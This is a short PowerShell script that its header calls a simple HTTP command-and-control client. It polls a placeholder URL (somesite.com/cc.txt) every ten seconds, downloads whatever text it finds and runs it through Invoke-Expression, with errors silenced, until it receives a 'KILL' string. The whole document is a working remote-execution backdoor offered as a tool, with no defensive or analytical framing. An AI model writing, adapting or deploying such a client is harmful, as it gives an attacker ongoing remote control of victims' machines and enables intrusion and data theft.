####################################################
# Simple command and control client, based on HTTP #
# Downloads a file from the provided URL and       #
# executes whatever commands are in it, line by    #
# line. Repeats every Interval seconds until the   #
# Kill command is met                              #
#                                                  #
#         Written by Andreas Aaris-Larsen          #
####################################################

$ErrorActionPreference='silentlycontinue';




$url='http://somesite.com/cc.txt';         #URL to get commands from.

$Interval = 10                                      #Interval with which to check for commands

$Killswitch = "KILL"                                #Killswitch. The command-file at $url should only contain 
                                                    # this single KILL command, or the script will crash

:looping while($true)
{
    Write-Host "Getting command..."
    $response = Invoke-WebRequest -Uri $url
    $Command = $response.Content

    

    if($Command.Trim() -ceq $Killswitch.Trim())
    {
        Write-Host "Kill command received, terminating..."
        Exit 
    }
    else
    {
        Write-Host "Command received: " $Command " - Executing..."
        Invoke-Expression($Command)    
        Write-Host "Command executed, going back to sleep."
        Start-Sleep -Second $Interval
    }    
}